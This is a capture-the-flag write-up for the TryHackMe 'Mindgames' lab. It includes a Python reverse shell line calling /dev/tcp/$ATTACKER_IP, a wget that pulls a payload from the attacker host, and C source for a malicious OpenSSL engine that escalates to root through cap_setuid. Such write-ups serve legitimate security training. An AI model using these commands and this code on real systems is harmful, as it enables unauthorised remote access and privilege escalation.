---
layout: default
title : bvr0n - mindgames Write-up
---

_**Oct 05, 2020**_

[Mindgames](https://tryhackme.com/room/mindgames) Writeup

## Nmap Scan :
```
bvr0n@kali:~/CTF/THM/Mindgames$ nmap -sC -sV -Pn 10.10.149.6

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Page : 

Looks like we have some brainfuck, after decoding the first one it gives some python3 regular :
```
print("Hello, World")
```
But when submitting the brainfuck code in the bottom form, it looks like it executs everything in python, let's turn our text into brainfuck get a revershell with this : 
```
import os

os.system('bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/8080 0>&1"')
```
And we got a reverse shell.

## Internal Enum :

Something caught my eyes when running linpeas :
```
Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep is writable
```
You can find out more about cap_setuid [HERE](https://man7.org/linux/man-pages/man3/cap_setuid.3.html) :

Now based on [GTFOBins](gtfobins.github.io/) : 
```
It loads shared libraries that may be used to run code in the binary execution context.
```


## Solution :

So in conclusion we need to create An OpenSSL Engine, [Check Here](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/) :

This is the final script :
```
#include <openssl/engine.h>
#include <unistd.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
}


IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
```
bvr0n@kali:~$ gcc -fPIC -o ssl-foo.o -c ssl-foo.c 
bvr0n@kali:~$ gcc -shared -o ssl-foo.so -lcrypto ssl-foo.o
```
then we download it from the victim's machine :
```
mindgames@mindgames:/tmp$ wget $ATTACKER_IP:8000/ssl-foo.so
```
and run our little engine :
```
mindgames@mindgames:/tmp$ openssl engine -t `pwd`/ssl-foo.so
root@mindgames:/tmp# id
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
```

And we are ROOT!!

<br>
best regards

[bvr0n](https://linkedin.com/in/taha-el-ghadraoui-5921771a5)


<br>
[back to main()](../../index.md)

<br>
